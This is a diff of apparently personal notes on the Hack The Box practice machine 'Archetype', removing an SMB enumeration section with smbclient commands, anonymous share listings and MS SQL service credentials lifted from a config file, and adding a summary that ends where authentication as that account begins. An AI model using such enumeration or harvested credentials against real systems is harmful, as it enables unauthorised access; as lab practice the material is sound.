@@ -1,51 +1,9 @@
-# Archetype (10.10.10.27) Services
+# Archetype (10.10.10.27) MSSQL
 [[archetype (10.10.10.27)]]
-## SMB
-1. List
-	```
-	tyler@tyler-ops:~$ smbclient -L 10.10.10.27
-	Enter WORKGROUP\tyler's password: <empty>
-	
-		Sharename       Type      Comment
-		---------       ----      -------
-		ADMIN$          Disk      Remote Admin
-		backups         Disk
-		C$              Disk      Default share
-		IPC$            IPC       Remote IPC
-	SMB1 disabled -- no workgroup available
-	```
-	![[Pasted image 20210816141309.png]]
-2. //10.10.10.27/backups/
-	```
-	tyler@tyler-ops:~$ smbclient //10.10.10.27/backups
-	Enter WORKGROUP\tyler's password: <empty>
-	Try "help" to get a list of possible commands.
-	smb: \> ls
-	  .                                   D        0  Mon Jan 20 04:20:57 2020
-	  ..                                  D        0  Mon Jan 20 04:20:57 2020
-	  prod.dtsConfig                     AR      609  Mon Jan 20 04:23:02 2020
-
-					10328063 blocks of size 4096. 8258776 blocks available
-	```
-	![[Pasted image 20210816141648.png]]
-3. //10.10.10.27/backups/prod.dtsConfig
-		- Extracted MS SQL credentials:
-			- User: `ARCHETYPE\sql_svc`
-			- Pass: `M3g4c0rp123`
-	```
-	<ConfiguredValue>
-	Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;	
-	</ConfiguredValue>
-	```
-	![[Pasted image 20210816144800.png]]
-4. //10.10.10.27/ADMIN$/
-	- Inaccessible with guest account
-5. //10.10.10.27/C$/
-	- Inaccessible with guest account
-6. //10.10.10.27/IPC$/
-	- Empty with guest account
-
-## MS SQL
+## Summary
+- Found user flag
+- Found adminstrator credentials
+## Procedure
 1. Anonymous Authentication (Failed)
 2. Authenticate as ARCHETYPE\sql_svc
 	```
